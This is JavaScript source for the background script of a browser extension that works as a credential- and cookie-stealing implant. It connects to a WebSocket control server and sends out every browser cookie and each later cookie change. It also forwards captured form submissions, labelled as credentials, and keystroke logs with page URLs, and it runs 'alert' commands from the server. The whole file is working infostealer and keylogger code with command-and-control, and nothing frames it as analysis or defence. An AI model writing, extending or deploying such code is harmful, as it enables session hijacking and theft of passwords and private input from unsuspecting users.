let ws;
let client_id;

function connectWebSocket() {
  ws = new WebSocket("ws://localhost:3000");

  ws.addEventListener("open", () => {
    console.log("WebSocket connected");
    chrome.storage.local.get("client_id", (data) => {
      client_id = data.client_id;
      if (!client_id) {
        client_id = Math.random().toString(36).substring(7);
        chrome.storage.local.set({ client_id });
      }
      send("alive", {
        client_id,
        os: "windows",
        username: "user",
      });
      chrome.cookies.getAll({}, function (cookies) {
        send("setcookies", cookies);
      });
      setInterval(() => {
        send("alive", {
          client_id,
          os: "Windows",
          username: "user",
        });
      }, 1000);
    });
  });
  ws.addEventListener("message", handleMessages);
  ws.addEventListener("close", () => {
    console.log(
      "WebSocket disconnected, attempting to reconnect in 1 seconds..."
    );
    setTimeout(() => {
      connectWebSocket();
    }, 1000);
  });
}

connectWebSocket();

function handleMessages(message) {
  try {
    const data = JSON.parse(message.data);
    switch (data[0]) {
      case "alert":
        sendMessageToContentScript(JSON.stringify(["alert", data[1]]));
        break;
    }
  } catch (err) {
    console.error(err);
  }
}
function send(type, data) {
  if (ws.readyState === WebSocket.OPEN) {
    ws.send(JSON.stringify([type, data]));
  } else {
    console.log("WebSocket is not open");
  }
}
function sendMessageToContentScript(message) {
  chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
    let activeTab = tabs[0]; // Get the active tab
    chrome.tabs.sendMessage(activeTab.id, { message: message }, (response) => {
      console.log("Response from content script:", response);
    });
  });
}

chrome.cookies.onChanged.addListener(function (changeInfo) {
  send("updatecookie", changeInfo.cookie);
});

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  switch (message.type) {
    case "FORM_SUBMISSION":
      // Log the received form data
      console.log(
        "Form submission received from:",
        sender.tab ? sender.tab.url : "unknown source"
      );
      console.log("Form data:", message.data);
      send("addsubmittedcredentials", message.data);
      // Store the form data (example using chrome.storage)
      chrome.storage.local.get(["formSubmissions"], (result) => {
        const submissions = result.formSubmissions || [];
        submissions.push(message.data);

        chrome.storage.local.set({ formSubmissions: submissions }, () => {
          console.log("Form submission stored successfully");
        });
      });

      // Send response back to content script
      sendResponse({ status: "success", timestamp: new Date().toISOString() });
      break;
    case "ACTIVITY_LOG":
      const logData = {
        keys: message.data.keys,
        timestamp: message.data.timestamp,
        url: message.data.url,
      };

      send("activitylog", logData);
      break;
  }

  // Required for async response
  return true;
});
